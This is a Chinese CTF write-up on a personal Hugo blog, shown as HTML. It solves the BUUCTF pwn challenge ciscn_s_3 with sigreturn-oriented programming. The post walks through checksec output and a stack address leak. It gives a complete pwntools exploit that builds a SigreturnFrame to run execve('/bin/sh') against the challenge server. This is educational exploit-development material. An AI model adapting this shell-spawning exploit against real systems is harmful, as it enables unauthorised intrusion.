@@ -1,0 +1,571 @@
+<!DOCTYPE html>
+<html
+  lang="zh"
+  dir="ltr"
+  
+><meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+
+
+<title>【基础SROP】【sig_return】ciscn_s_3 - Peter Liu的个人博客</title>
+
+<meta name="generator" content="Hugo Eureka 0.9.3" />
+<link rel="stylesheet" href="https://peterliuzhi.top/css/eureka.min.9cec6350e37e534b0338fa9a085bf06855de3b0f2dcf857e792e5e97b07ea905d4d5513db554cbc26a9c3da622bae92d.css">
+<script defer src="https://peterliuzhi.top/js/eureka.min.fa9a6bf6d7a50bb635b4cca7d2ba5cf3dfb095ae3798773f1328f7950028b48c17d06276594e1b5f244a25a6c969a705.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link rel="preload"
+  href="https://fonts.googleapis.com/css2?family=Lora:wght@400;600;700&amp;family=Noto&#43;Serif&#43;SC:wght@400;600;700&amp;display=swap"
+  as="style" onload="this.onload=null;this.rel='stylesheet'">
+
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.4.0/build/styles/base16/solarized-light.min.css"
+   media="print"
+  onload="this.media='all';this.onload=null" crossorigin>
+<script defer src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.4.0/build/highlight.min.js"
+   crossorigin></script>
+  <script defer src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.4.0/build/languages/dart.min.js"
+     crossorigin></script>
+  <script defer src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.4.0/build/languages/python.min.js"
+     crossorigin></script>
+  <script defer src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.4.0/build/languages/bash.min.js"
+     crossorigin></script>
+<link rel="stylesheet" href="https://peterliuzhi.top/css/highlightjs.min.0e3b6ac4177cdecae52d1b2de76aa7a0ce8a92e4cc23ef2f8691f0218a25f5d328e14bf47be023009535efe940980954.css" media="print" onload="this.media='all';this.onload=null">
+
+
+
+<script src="https://kit.fontawesome.com/99649a0b4d.js" crossorigin="anonymous"></script>
+
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.css"
+   integrity="sha384-MlJdn/WNKDGXveldHDdyRP1R4CTHr3FeuDNfhsLPYrq2t0UBkUdK2jyTnXPEK1NQ"  media="print"
+  onload="this.media='all';this.onload=null" crossorigin>
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.js" 
+  integrity="sha384-VQ8d8WVFw0yHhCk5E8I86oOhv48xLpnDZx5T9GogA/Y84DcCKWXDmSDfn13bzFZY"  crossorigin></script>
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/contrib/auto-render.min.js"
+   integrity="sha384-&#43;XBljXPPiv&#43;OzfbB3cVmLHf4hdUFHlWNZN5spNQ7rmHTXpd7WvJum6fIACpNNfIR"  crossorigin></script>
+<script>
+  document.addEventListener("DOMContentLoaded", function () {
+    renderMathInElement(document.body, {
+      delimiters: [
+        { left: "$$", right: "$$", display: true },
+        { left: "$", right: "$", display: false },
+        { left: "\\(", right: "\\)", display: false },
+        { left: "\\[", right: "\\]", display: true }
+      ],
+    });
+  });
+</script>
+
+
+<script defer src="https://cdn.jsdelivr.net/npm/mermaid@8.14.0/dist/mermaid.min.js" 
+  integrity="sha384-atOyb0FxAgN9LyAc6PEf9BjgwLISyansgdH8/VXQH8p2o5vfrRgmGIJ2Sg22L0A0"  crossorigin></script>
+
+
+
+<link rel="icon" type="image/png" sizes="32x32" href="https://peterliuzhi.top/images/selficon_hu7999937fb0799ea2efe2916a84368012_9703_32x32_fill_q75_box_center.jpg">
+<link rel="apple-touch-icon" sizes="180x180" href="https://peterliuzhi.top/images/selficon_hu7999937fb0799ea2efe2916a84368012_9703_180x180_fill_q75_box_center.jpg">
+
+<meta name="description"
+  content="BUUCTF ciscn_s_3的解析">
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [{
+      "@type": "ListItem",
+      "position": 1 ,
+      "name":"Writeups",
+      "item":"https://peterliuzhi.top/writeup/"},{
+      "@type": "ListItem",
+      "position": 2 ,
+      "name":"【基础SROP】【sig_return】ciscn_s_3",
+      "item":"https://peterliuzhi.top/writeup/%E5%9F%BA%E7%A1%80sropsig_returnciscn_s_3/"}]
+}
+</script>
+
+
+
+<script type="application/ld+json">
+{
+    "@context": "https://schema.org",
+    "@type": "Article",
+    "mainEntityOfPage": {
+        "@type": "WebPage",
+        "@id": "https://peterliuzhi.top/writeup/%E5%9F%BA%E7%A1%80sropsig_returnciscn_s_3/"
+    },
+    "headline": "【基础SROP】【sig_return】ciscn_s_3 - Peter Liu的个人博客","datePublished": "2022-12-29T03:01:44+08:00",
+    "dateModified": "2022-12-29T03:01:44+08:00",
+    "wordCount":  638 ,
+    "publisher": {
+        "@type": "Person",
+        "name": "Peter Liu",
+        "logo": {
+            "@type": "ImageObject",
+            "url": "https://peterliuzhi.top/images/selficon.jpg"
+        }
+        },
+    "description": "BUUCTF ciscn_s_3的解析"
+}
+</script><meta property="og:title" content="【基础SROP】【sig_return】ciscn_s_3 - Peter Liu的个人博客" />
+<meta property="og:type" content="article" />
+
+
+<meta property="og:image" content="https://peterliuzhi.top/images/selficon.jpg">
+
+
+<meta property="og:url" content="https://peterliuzhi.top/writeup/%E5%9F%BA%E7%A1%80sropsig_returnciscn_s_3/" />
+
+
+
+<meta property="og:description" content="BUUCTF ciscn_s_3的解析" />
+
+
+
+<meta property="og:locale" content="zh" />
+
+
+
+
+<meta property="og:site_name" content="Peter Liu的个人博客" />
+
+
+
+
+
+
+<meta property="article:published_time" content="2022-12-29T03:01:44&#43;08:00" />
+
+
+<meta property="article:modified_time" content="2022-12-29T03:01:44&#43;08:00" />
+
+
+
+<meta property="article:section" content="writeup" />
+
+
+<meta property="article:tag" content="pwn" />
+
+<meta property="article:tag" content="基础SROP" />
+
+<meta property="article:tag" content="sig_return" />
+
+
+
+
+
+<meta property="og:see_also" content="https://peterliuzhi.top/writeup/jarvisoj_level2_x64/" />
+
+<meta property="og:see_also" content="https://peterliuzhi.top/writeup/ciscn_2019_ne_5/" />
+
+<meta property="og:see_also" content="https://peterliuzhi.top/writeup/32%E4%BD%8D%E7%B3%BB%E7%BB%9F%E4%BC%A0%E5%8F%82buuctf-picoctf_2018_rop-chain/" />
+
+<meta property="og:see_also" content="https://peterliuzhi.top/writeup/c&#43;&#43;pwnzjctf-2019login/" />
+
+<meta property="og:see_also" content="https://peterliuzhi.top/writeup/c%E5%86%85%E5%B5%8C%E6%B1%87%E7%BC%96others_shellcode/" />
+
+<meta property="og:see_also" content="https://peterliuzhi.top/writeup/harekazectf2019baby_rop/" />
+
+
+
+
+  <body class="flex min-h-screen flex-col">
+    <header
+      class="min-h-16 pl-scrollbar bg-secondary-bg fixed z-50 flex w-full items-center shadow-sm"
+    >
+      <div class="mx-auto w-full max-w-screen-xl"><style>
+.search-container {
+  margin-top: -0.3rem;
+  margin-right: 1rem;
+}
+.search-container .search {
+  border: 1px solid #e2e8f0;
+  border-radius: 4px;
+}
+.search-container input {
+  padding-left: 1rem;
+  line-height: 2rem;
+  outline: none;
+  background: transparent;
+}
+.search-container button {
+  font-size: 0.8rem;
+  margin-right: 0.5rem;
+  color: #e2e8f0;
+}
+</style>
+<script>
+    let storageColorScheme = localStorage.getItem("lightDarkMode")
+    if (((storageColorScheme == 'Auto' || storageColorScheme == null) && window.matchMedia("(prefers-color-scheme: dark)").matches) || storageColorScheme == "Dark") {
+        document.getElementsByTagName('html')[0].classList.add('dark')
+    }
+</script>
+<nav class="flex items-center justify-between flex-wrap px-4 py-4 md:py-0">
+    <a href="/" class="me-6 text-primary-text text-xl font-bold">Peter Liu的个人博客</a>
+    <button id="navbar-btn" class="md:hidden flex items-center px-3 py-2" aria-label="Open Navbar">
+        <i class="fas fa-bars"></i>
+    </button>
+
+    <div id="target"
+        class="hidden block md:flex md:grow md:justify-between md:items-center w-full md:w-auto text-primary-text z-20">
+        <div class="md:flex md:h-16 text-sm md:grow pb-4 md:pb-0 border-b md:border-b-0">
+            <a href="/#about" class="block mt-4 md:inline-block md:mt-0 md:h-(16-4px) md:leading-(16-4px) box-border md:border-t-2 md:border-b-2  border-transparent  me-4">About</a>
+            <a href="/posts/" class="block mt-4 md:inline-block md:mt-0 md:h-(16-4px) md:leading-(16-4px) box-border md:border-t-2 md:border-b-2  border-transparent  me-4">Posts</a>
+            <a href="/writeup/" class="block mt-4 md:inline-block md:mt-0 md:h-(16-4px) md:leading-(16-4px) box-border md:border-t-2 md:border-b-2  selected-menu-item  me-4">WriteUp</a>
+            <a href="/tricks/" class="block mt-4 md:inline-block md:mt-0 md:h-(16-4px) md:leading-(16-4px) box-border md:border-t-2 md:border-b-2  border-transparent  me-4">Tricks</a>
+            <a href="/archive/" class="block mt-4 md:inline-block md:mt-0 md:h-(16-4px) md:leading-(16-4px) box-border md:border-t-2 md:border-b-2  border-transparent  me-4">Archive</a>
+        </div>
+
+        <div class="flex">
+            <div class="search-container relative pt-4 md:pt-0">
+                <div class="search">
+                    <form role="search" class="search-form" action="/search.html" method="get">
+                    <label>
+                        <input name="q" type="text" placeholder="搜索 ..." class="search-field">
+                    </label>
+                    <button>
+                        <i class="fa-solid fa-magnifying-glass"></i>
+                    </button>
+                    </form>
+                </div>
+            </div>
+
+        <div class="flex">
+            <div class="relative pt-4 md:pt-0">
+                <div class="cursor-pointer hover:text-eureka" id="lightDarkMode">
+                    <i class="fas fa-adjust"></i>
+                </div>
+                <div class="fixed hidden inset-0 opacity-0 h-full w-full cursor-default z-30" id="is-open">
+                </div>
+                <div class="absolute flex flex-col start-0 md:start-auto end-auto md:end-0 hidden bg-secondary-bg w-48 rounded py-2 border border-tertiary-bg cursor-pointer z-40"
+                    id='lightDarkOptions'>
+                    <span class="px-4 py-1 hover:text-eureka" name="Light">浅色</span>
+                    <span class="px-4 py-1 hover:text-eureka" name="Dark">深色</span>
+                    <span class="px-4 py-1 hover:text-eureka" name="Auto">自动</span>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="fixed hidden inset-0 opacity-0 h-full w-full cursor-default z-0" id="is-open-mobile">
+    </div>
+
+</nav>
+<script>
+    
+    let element = document.getElementById('lightDarkMode')
+    if (storageColorScheme == null || storageColorScheme == 'Auto') {
+        document.addEventListener('DOMContentLoaded', () => {
+            window.matchMedia("(prefers-color-scheme: dark)").addEventListener('change', switchDarkMode)
+        })
+    } else if (storageColorScheme == "Light") {
+        element.firstElementChild.classList.remove('fa-adjust')
+        element.firstElementChild.setAttribute("data-icon", 'sun')
+        element.firstElementChild.classList.add('fa-sun')
+    } else if (storageColorScheme == "Dark") {
+        element.firstElementChild.classList.remove('fa-adjust')
+        element.firstElementChild.setAttribute("data-icon", 'moon')
+        element.firstElementChild.classList.add('fa-moon')
+    }
+
+    document.addEventListener('DOMContentLoaded', () => {
+        getcolorscheme();
+        switchBurger();
+    });
+</script>
+</div>
+    </header>
+    <main class="grow pt-16">
+        <div class="pl-scrollbar">
+          <div class="mx-auto w-full max-w-screen-xl lg:px-4 xl:px-8">
+  
+  
+  <div class="grid grid-cols-2 gap-4 lg:grid-cols-8 lg:pt-12">
+    <div
+      class=" bg-secondary-bg col-span-2 rounded px-6 py-8 lg:col-span-6"
+    >
+      <article class="prose">
+  <h1 class="mb-4">【基础SROP】【sig_return】ciscn_s_3</h1>
+
+  <div
+  class="text-tertiary-text not-prose mt-2 flex flex-row flex-wrap items-center"
+>
+  <div class="me-6 my-2">
+    <i class="fas fa-calendar me-1"></i>
+    <span
+      >Thursday, December 29, 2022</span
+    >
+  </div>
+  <div class="me-6 my-2">
+    <i class="fas fa-clock me-1"></i>
+    <span>2分钟阅读时长</span>
+  </div>
+
+  
+    <div class="me-6 my-2">
+      <i class="fas fa-folder me-1"></i>
+      
+        <a href="https://peterliuzhi.top/categories/writeup/" class="hover:text-eureka"
+          >writeup</a
+        >
+      
+    </div>
+  
+
+  
+</div>
+
+
+  
+  
+
+  <p><a href="https://buuoj.cn/challenges#ciscn_s_3">原题链接</a></p>
+<ul>
+<li><a href="#checksec%E6%9F%A5%E7%9C%8B%E7%A8%8B%E5%BA%8F%E6%9E%B6%E6%9E%84">checksec查看程序架构</a></li>
+<li><a href="#ida%E6%9F%A5%E7%9C%8B%E7%A8%8B%E5%BA%8F%E4%BC%AA%E4%BB%A3%E7%A0%81">ida查看程序伪代码</a></li>
+<li><a href="#%E6%9E%84%E5%BB%BAexp">构建exp</a>
+<ul>
+<li><a href="#%E5%AE%8C%E6%95%B4exp">完整exp</a></li>
+</ul>
+</li>
+</ul>
+<h2 id="checksec查看程序架构">checksec查看程序架构</h2>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ checksec --file ciscn_s_3
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> <span class="s1">&#39;/home/peterl/security/workspace/ciscn_s_3/ciscn_s_3&#39;</span>
+</span></span><span class="line"><span class="cl">    Arch:     amd64-64-little
+</span></span><span class="line"><span class="cl">    RELRO:    Partial RELRO
+</span></span><span class="line"><span class="cl">    Stack:    No canary found
+</span></span><span class="line"><span class="cl">    NX:       NX enabled
+</span></span><span class="line"><span class="cl">    PIE:      No PIE <span class="o">(</span>0x400000<span class="o">)</span>
+</span></span></code></pre></div><h2 id="ida查看程序伪代码">ida查看程序伪代码</h2>
+<p><img src="../../image/202210120929012022-10-12-09-29-02.png" alt="202210120929012022-10-12-09-29-02"></p>
+<p><img src="../../image/202210120929442022-10-12-09-29-45.png" alt="202210120929442022-10-12-09-29-45"></p>
+<p>这里有两个syscall用于读写，已经很明显地暗示要用syscall了</p>
+<p>接下来它又提供了一个gadget函数，明显是要为sig_return做好前置工作（设置RAX）</p>
+<p><img src="../../image/202210120932312022-10-12-09-32-32.png" alt="202210120932312022-10-12-09-32-32"></p>
+<p>那么我们的思路就很简单了，先调用sig_return，这样它就会把接下来我们安排在栈上的上下文作为接下来要恢复的上下文，这样我们就可以安排系统的寄存器了</p>
+<h2 id="构建exp">构建exp</h2>
+<p>首先第一次运行的时候会打印出来rbp的地址，为了让程序再运行一遍，我们将ret地址设置为<code>vul</code>函数的地址：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">stack_offset</span> <span class="o">=</span> <span class="o">-</span><span class="mh">0x118</span>
+</span></span><span class="line"><span class="cl"><span class="n">write_offset</span> <span class="o">=</span> <span class="mh">0x20</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">clean</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;a&#34;</span><span class="o">*</span><span class="mh">0x10</span> <span class="o">+</span> <span class="n">pg</span><span class="p">(</span><span class="n">m_elf</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;vuln&#39;</span><span class="p">]))</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="n">write_offset</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">bin_bash_addr</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">8</span><span class="p">))</span> <span class="o">+</span> <span class="n">stack_offset</span>
+</span></span></code></pre></div><p>通过调试时的偏移计算，我们就获得了栈地址</p>
+<p>然后我们就可以通过pwntools的自动化工具构建sig_return后恢复的上下文了</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">sig_ret_gadget</span> <span class="o">=</span> <span class="mh">0x4004DA</span>
+</span></span><span class="line"><span class="cl"><span class="n">syscall_ret</span> <span class="o">=</span> <span class="mh">0x400517</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 使用pwntools的自动化工具构建我们想要的上下文</span>
+</span></span><span class="line"><span class="cl"><span class="n">frame</span> <span class="o">=</span> <span class="n">SigreturnFrame</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">frame</span><span class="o">.</span><span class="n">rax</span> <span class="o">=</span> <span class="n">constants</span><span class="o">.</span><span class="n">SYS_execve</span>
+</span></span><span class="line"><span class="cl"><span class="n">frame</span><span class="o">.</span><span class="n">rdi</span> <span class="o">=</span> <span class="n">bin_bash_addr</span>
+</span></span><span class="line"><span class="cl"><span class="n">frame</span><span class="o">.</span><span class="n">rsi</span> <span class="o">=</span> <span class="mi">0</span>
+</span></span><span class="line"><span class="cl"><span class="n">frame</span><span class="o">.</span><span class="n">rdx</span> <span class="o">=</span> <span class="mi">0</span>
+</span></span><span class="line"><span class="cl"><span class="n">frame</span><span class="o">.</span><span class="n">rip</span> <span class="o">=</span> <span class="n">syscall_ret</span>
+</span></span><span class="line"><span class="cl"><span class="n">success</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">frame</span><span class="p">))</span>
+</span></span></code></pre></div><p>然后按<code>sig_return+上下文</code>的格式发过去就可以了：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;/bin/sh</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="o">*</span><span class="mh">0x2</span> <span class="o">+</span> <span class="n">pg</span><span class="p">(</span><span class="n">sig_ret_gadget</span><span class="p">)</span> <span class="o">+</span> <span class="n">pg</span><span class="p">(</span><span class="n">syscall_ret</span><span class="p">)</span> \
+</span></span><span class="line"><span class="cl">    <span class="o">+</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">frame</span><span class="p">))</span>
+</span></span></code></pre></div><h3 id="完整exp">完整exp</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="n">p64</span><span class="p">,</span> <span class="n">p32</span><span class="p">,</span> <span class="n">u32</span><span class="p">,</span> <span class="n">u64</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">LibcSearcher</span> <span class="kn">import</span> <span class="n">LibcSearcher</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">pss</span><span class="p">:</span> <span class="nb">bool</span> <span class="o">=</span> <span class="kc">True</span>
+</span></span><span class="line"><span class="cl"><span class="n">fn</span><span class="p">:</span> <span class="nb">str</span> <span class="o">=</span> <span class="s2">&#34;./ciscn_s_3&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">libc_name</span><span class="p">:</span><span class="nb">str</span> <span class="o">=</span> <span class="s2">&#34;/lib/x86_64-linux-gnu/libc.so.6&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">port</span><span class="p">:</span> <span class="nb">str</span> <span class="o">=</span> <span class="s2">&#34;28554&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">if_32</span><span class="p">:</span> <span class="nb">bool</span> <span class="o">=</span> <span class="kc">False</span>
+</span></span><span class="line"><span class="cl"><span class="n">if_debug</span><span class="p">:</span><span class="nb">bool</span> <span class="o">=</span> <span class="kc">False</span>
+</span></span><span class="line"><span class="cl"><span class="n">pg</span> <span class="o">=</span> <span class="n">p32</span> <span class="k">if</span> <span class="n">if_32</span> <span class="k">else</span> <span class="n">p64</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">log_level</span><span class="o">=</span><span class="s2">&#34;debug&#34;</span><span class="p">,</span> <span class="n">arch</span><span class="o">=</span><span class="s2">&#34;i386&#34;</span> <span class="k">if</span> <span class="n">if_32</span> <span class="k">else</span> <span class="s2">&#34;amd64&#34;</span><span class="p">,</span> <span class="n">os</span><span class="o">=</span><span class="s2">&#34;linux&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="n">pss</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;node4.buuoj.cn&#34;</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">if_debug</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">p</span> <span class="o">=</span> <span class="n">gdb</span><span class="o">.</span><span class="n">debug</span><span class="p">(</span><span class="n">fn</span><span class="p">,</span> <span class="s2">&#34;break main&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="n">fn</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 两个elf，注意libc的版本</span>
+</span></span><span class="line"><span class="cl"><span class="n">m_elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">fn</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">libc_name</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">stack_offset</span> <span class="o">=</span> <span class="o">-</span><span class="mh">0x118</span>
+</span></span><span class="line"><span class="cl"><span class="n">write_offset</span> <span class="o">=</span> <span class="mh">0x20</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">clean</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;a&#34;</span><span class="o">*</span><span class="mh">0x10</span> <span class="o">+</span> <span class="n">pg</span><span class="p">(</span><span class="n">m_elf</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;vuln&#39;</span><span class="p">]))</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="n">write_offset</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">bin_bash_addr</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">8</span><span class="p">))</span> <span class="o">+</span> <span class="n">stack_offset</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">clean</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">sig_ret_gadget</span> <span class="o">=</span> <span class="mh">0x4004DA</span>
+</span></span><span class="line"><span class="cl"><span class="n">syscall_ret</span> <span class="o">=</span> <span class="mh">0x400517</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 使用pwntools的自动化工具构建我们想要的上下文</span>
+</span></span><span class="line"><span class="cl"><span class="n">frame</span> <span class="o">=</span> <span class="n">SigreturnFrame</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">frame</span><span class="o">.</span><span class="n">rax</span> <span class="o">=</span> <span class="n">constants</span><span class="o">.</span><span class="n">SYS_execve</span>
+</span></span><span class="line"><span class="cl"><span class="n">frame</span><span class="o">.</span><span class="n">rdi</span> <span class="o">=</span> <span class="n">bin_bash_addr</span>
+</span></span><span class="line"><span class="cl"><span class="n">frame</span><span class="o">.</span><span class="n">rsi</span> <span class="o">=</span> <span class="mi">0</span>
+</span></span><span class="line"><span class="cl"><span class="n">frame</span><span class="o">.</span><span class="n">rdx</span> <span class="o">=</span> <span class="mi">0</span>
+</span></span><span class="line"><span class="cl"><span class="n">frame</span><span class="o">.</span><span class="n">rip</span> <span class="o">=</span> <span class="n">syscall_ret</span>
+</span></span><span class="line"><span class="cl"><span class="n">success</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">frame</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;/bin/sh</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="o">*</span><span class="mh">0x2</span> <span class="o">+</span> <span class="n">pg</span><span class="p">(</span><span class="n">sig_ret_gadget</span><span class="p">)</span> <span class="o">+</span> <span class="n">pg</span><span class="p">(</span><span class="n">syscall_ret</span><span class="p">)</span> \
+</span></span><span class="line"><span class="cl">    <span class="o">+</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">frame</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">clean</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span></code></pre></div>
+</article>
+
+
+      
+        <div class="my-4">
+    
+    <a href="https://peterliuzhi.top/tags/pwn/" class="inline-block bg-tertiary-bg text-sm rounded px-3 py-1 my-1 me-2 hover:text-eureka">#pwn</a>
+    
+    <a href="https://peterliuzhi.top/tags/%E5%9F%BA%E7%A1%80srop/" class="inline-block bg-tertiary-bg text-sm rounded px-3 py-1 my-1 me-2 hover:text-eureka">#基础SROP</a>
+    
+    <a href="https://peterliuzhi.top/tags/sig_return/" class="inline-block bg-tertiary-bg text-sm rounded px-3 py-1 my-1 me-2 hover:text-eureka">#sig_return</a>
+    
+</div>
+      
+
+      
+
+
+
+      
+
+      
+  <div
+    class="-mx-2 mt-4 flex flex-col border-t px-2 pt-4 md:flex-row md:justify-between"
+  >
+    <div>
+      
+        <span class="text-primary-text block font-bold"
+          >上一页</span
+        >
+        <a href="https://peterliuzhi.top/writeup/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9Ejarvisoj_fm/" class="block">【格式化字符串漏洞】jarvisoj_fmm</a>
+      
+    </div>
+    <div class="mt-4 md:mt-0 md:text-right">
+      
+        <span class="text-primary-text block font-bold">下一页</span>
+        <a href="https://peterliuzhi.top/writeup/%E5%88%A9%E7%94%A8int-80h%E5%88%A9%E7%94%A8mprotect%E5%87%BD%E6%95%B0buuctf-cmcc_simplerop/" class="block">【利用int 80h】【利用mprotect函数】BUUCTF cmcc_simplerop</a>
+      
+    </div>
+  </div>
+
+
+      
+
+
+
+    </div>
+    
+      <div class="col-span-2">
+        
+        
+          <div
+  class="
+    bg-primary-bg
+   prose sticky top-16 z-10 hidden px-6 py-4 lg:block"
+>
+  <h3>本页内容</h3>
+</div>
+<div
+  class="sticky-toc  hidden px-6 pb-6 lg:block"
+>
+  <nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#checksec查看程序架构">checksec查看程序架构</a></li>
+        <li><a href="#ida查看程序伪代码">ida查看程序伪代码</a></li>
+        <li><a href="#构建exp">构建exp</a>
+          <ul>
+            <li><a href="#完整exp">完整exp</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+</div>
+<script>
+  window.addEventListener("DOMContentLoaded", () => {
+    enableStickyToc();
+  });
+</script>
+
+        
+      </div>
+    
+
+    
+    
+      <div
+        class=" bg-secondary-bg prose col-span-2 rounded p-6 lg:col-span-6"
+      >
+        <h3>相关</h3>
+        
+          <a href="https://peterliuzhi.top/writeup/jarvisoj_level2_x64/" class="no-underline">BUUCTF Jarvisoj_level2_x64</a>
+          <br />
+        
+          <a href="https://peterliuzhi.top/writeup/ciscn_2019_ne_5/" class="no-underline">BUUCTF ciscn_2019_ne_5</a>
+          <br />
+        
+          <a href="https://peterliuzhi.top/writeup/32%E4%BD%8D%E7%B3%BB%E7%BB%9F%E4%BC%A0%E5%8F%82buuctf-picoctf_2018_rop-chain/" class="no-underline">【32位系统传参】BUUCTF picoctf_2018_rop chain</a>
+          <br />
+        
+          <a href="https://peterliuzhi.top/writeup/c&#43;&#43;pwnzjctf-2019login/" class="no-underline">【C&#43;&#43;Pwn】[ZJCTF 2019]Login</a>
+          <br />
+        
+          <a href="https://peterliuzhi.top/writeup/c%E5%86%85%E5%B5%8C%E6%B1%87%E7%BC%96others_shellcode/" class="no-underline">【C内嵌汇编】others_shellcode</a>
+          <br />
+        
+          <a href="https://peterliuzhi.top/writeup/harekazectf2019baby_rop/" class="no-underline">【HarekazeCTF2019】baby_rop</a>
+          <br />
+        
+      </div>
+    
+  </div>
+
+  
+    <script>
+      document.addEventListener("DOMContentLoaded", () => {
+        hljs.highlightAll();
+      });
+    </script>
+
+          </div>
+        </div>
+      
+    </main>
+    <footer class="pl-scrollbar">
+      <div class="mx-auto w-full max-w-screen-xl"><div class="text-center p-6 pin-b">
+    <p class="text-sm text-tertiary-text">&copy; 2023 <a href="https://github.com/PeterLiu-all">Peter Liu</a>
+ &middot;  Powered by the <a href="https://github.com/wangchucheng/hugo-eureka" class="hover:text-eureka">Eureka</a> theme for <a href="https://gohugo.io" class="hover:text-eureka">Hugo</a></p>
